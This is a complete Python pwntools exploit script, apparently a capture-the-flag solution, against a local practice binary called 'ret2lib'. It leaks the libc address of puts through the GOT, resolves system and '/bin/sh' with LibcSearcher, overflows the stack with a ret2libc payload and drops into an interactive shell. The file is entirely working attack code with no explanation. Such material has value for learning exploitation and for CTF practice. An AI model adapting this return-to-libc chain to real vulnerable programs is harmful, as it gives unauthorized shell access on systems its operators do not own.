#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"

elf = ELF("./ret2lib")
puts_got = elf.got["puts"]

io = process("./ret2lib")
io.sendlineafter(" :", str(puts_got))
io.recvuntil("0x")
puts_addr = int(io.recvuntil("\n"), 16)

libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
sys_addr = libc_base + libc.dump("system")
sh_addr = libc_base + libc.dump("str_bin_sh")

payload = fit({0x38 + 0x4: [p32(sys_addr), p32(0xdeadbeef), p32(sh_addr)]})
io.sendlineafter(" :", payload)
io.interactive()
io.close()
